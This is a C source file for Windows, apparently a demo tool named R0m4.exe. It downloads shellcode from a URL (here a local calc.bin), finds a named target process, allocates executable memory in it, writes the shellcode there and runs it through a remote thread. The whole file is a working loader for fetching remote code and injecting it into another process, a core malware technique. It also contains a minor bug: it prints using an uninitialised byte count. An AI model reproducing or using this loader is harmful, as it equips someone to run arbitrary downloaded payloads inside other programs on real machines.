#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#include <wininet.h>
#include <tlhelp32.h>
#include <string.h>


// Some macros to help in the process of writing and printing texts 
#define okay(msg, ...) printf("[+]" msg "\n", __VA_ARGS__)
#define info(msg, ...) printf("[+]" msg "\n", __VA_ARGS__)
#define warning(msg, ...) printf("[-]" msg "\n", __VA_ARGS__)



PROCESSENTRY32 Proc;
HANDLE hProcess, hThread = NULL;
PBYTE pBytes = NULL;
DWORD dwBytesRead;

// Function to download shellcode from a URL
PBYTE downloadShellcode(const wchar_t* url, DWORD* shellcodeSize) {
    HINTERNET hInternet = InternetOpenW(L"Shellcode Downloader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);
    if (!hInternet) {
        printf("We can't connect to the Internet error: %lx\n", GetLastError());
        return NULL;
    }
    printf("Connection has been established.\n");

    HINTERNET hUrl = InternetOpenUrlW(hInternet, url, NULL, 0, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0);
    if (!hUrl) {
        printf("We can't open the URL error: %lx\n", GetLastError());
        InternetCloseHandle(hInternet);
        return NULL;
    }
    printf("URL has been opened.\n");

    // Allocate memory for shellcode (600 bytes for example)
    pBytes = (PBYTE)LocalAlloc(LPTR, 600);
    if (!pBytes) {
        printf("Memory allocation failed.\n");
        InternetCloseHandle(hUrl);
        InternetCloseHandle(hInternet);
        return NULL;
    }

    if (!InternetReadFile(hUrl, pBytes, 600, shellcodeSize)) {
        printf("Error reading file: %lx\n", GetLastError());
        LocalFree(pBytes);
        InternetCloseHandle(hUrl);
        InternetCloseHandle(hInternet);
        return NULL;
    }

    printf("Downloaded %lu bytes.\n", *shellcodeSize);
    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);
    return pBytes;
}

int main(int argc, char* argv[]) {
    if (argc < 2) {
        warning("You must enter the process name to inject the shellcode!\nUSAGE: R0m4.exe <Process Name>");
        return EXIT_FAILURE;
    }

    DWORD PID, TID = NULL;
    WCHAR target[MAX_PATH];
    size_t convertedChars = 0;
    mbstowcs_s(&convertedChars, target, MAX_PATH, argv[1], _TRUNCATE);

    // Step 1: Download the shellcode from a remote URL
    DWORD shellcodeSize = 0;
    PBYTE shellcode = downloadShellcode(L"http://127.0.0.1:8000/calc.bin", &shellcodeSize);
    if (!shellcode) {
        warning("Failed to download shellcode.\n");
        return EXIT_FAILURE;
    }
    

    for (DWORD i = 0; i < dwBytesRead; i++) {
        printf("%02X ", pBytes[i]);
        if ((i + 1) % 16 == 0) printf("\n");  // Print 16 bytes per line for readability
    }


    // Step 2: Find the target process
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        LocalFree(shellcode);
        return 1;
    }
    Proc.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hSnapshot, &Proc)) {
        LocalFree(shellcode);
        CloseHandle(hSnapshot);
        return 1;
    }

    do {
        printf("Checking process: %ls\n", Proc.szExeFile);
        if (wcscmp(Proc.szExeFile, target) == 0) {
            PID = Proc.th32ProcessID;
            okay("Found the process: %ls with PID: %ld\n", target, PID);
            break;
        }
    } while (Process32Next(hSnapshot, &Proc));

    CloseHandle(hSnapshot);

    if (!PID) {
        warning("Target process not found.\n");
        LocalFree(shellcode);
        return EXIT_FAILURE;
    }

    // Step 3: Open the target process
    info("Attempting to open process with ID: %ld\n", PID);
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
    if (hProcess == NULL) {
        warning("Unable to open process with PID %ld. Error: %ld\n", PID, GetLastError());
        LocalFree(shellcode);
        return EXIT_FAILURE;
    }

    info("Successfully opened the process.\n");

    // Step 4: Allocate memory in the target process
    LPVOID rBuffer = VirtualAllocEx(hProcess, NULL, shellcodeSize, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
    if (!rBuffer) {
        warning("Memory allocation failed in target process.\n");
        CloseHandle(hProcess);
        LocalFree(shellcode);
        return EXIT_FAILURE;
    }
    info("Allocated %lu bytes with PAGE_EXECUTE_READWRITE in process %ld\n", shellcodeSize, PID);

    // Step 5: Write shellcode into the target process
    WriteProcessMemory(hProcess, rBuffer, shellcode, shellcodeSize, NULL);
    info("Wrote %lu bytes to process memory.\n", shellcodeSize);

    // Step 6: Create remote thread in the target process
    hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, &TID);
    if (!hThread) {
        warning("Unable to create remote thread in process with PID %ld. Error: %ld\n", PID, GetLastError());
        VirtualFreeEx(hProcess, rBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        LocalFree(shellcode);
        return EXIT_FAILURE;
    }
    okay("Created remote thread %ld (0x%p) in process.\n", TID, hThread);

    // Step 7: Wait for the thread to finish and clean up
    WaitForSingleObject(hThread, INFINITE);
    info("Thread finished executing.\n");

    // Cleanup
    CloseHandle(hThread);
    CloseHandle(hProcess);
    LocalFree(shellcode);

    info("Process finished. See you next time!\n");
    return EXIT_SUCCESS;
}
